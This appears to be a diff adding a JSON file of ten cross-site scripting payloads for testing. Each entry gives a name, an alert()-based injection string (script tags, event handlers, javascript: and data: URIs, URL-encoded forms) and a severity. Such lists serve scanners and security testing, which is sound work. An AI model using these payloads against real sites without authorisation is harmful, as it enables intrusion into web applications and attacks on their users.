@@ -1,0 +1,16 @@
+{
+  "version": "1.0.0",
+  "description": "XSS attack payloads collection",
+  "payloads": [
+    {"name": "Basic Script", "payload": "<script>alert('XSS')</script>", "severity": "high"},
+    {"name": "Image Event", "payload": "<img src=x onerror=alert(1)>", "severity": "high"},
+    {"name": "SVG Onload", "payload": "<svg onload=alert(1)>", "severity": "high"},
+    {"name": "Body Onload", "payload": "<body onload=alert(1)>", "severity": "high"},
+    {"name": "Iframe JS", "payload": "<iframe src=javascript:alert(1)>", "severity": "high"},
+    {"name": "Input Event", "payload": "<input onfocus=alert(1) autofocus>", "severity": "medium"},
+    {"name": "Details Open", "payload": "<details open ontoggle=alert(1)>", "severity": "medium"},
+    {"name": "JavaScript Protocol", "payload": "javascript:alert(1)", "severity": "high"},
+    {"name": "Data Protocol", "payload": "data:text/html,<script>alert(1)</script>", "severity": "high"},
+    {"name": "Encoded Payload", "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E", "severity": "high"}
+  ]
+}
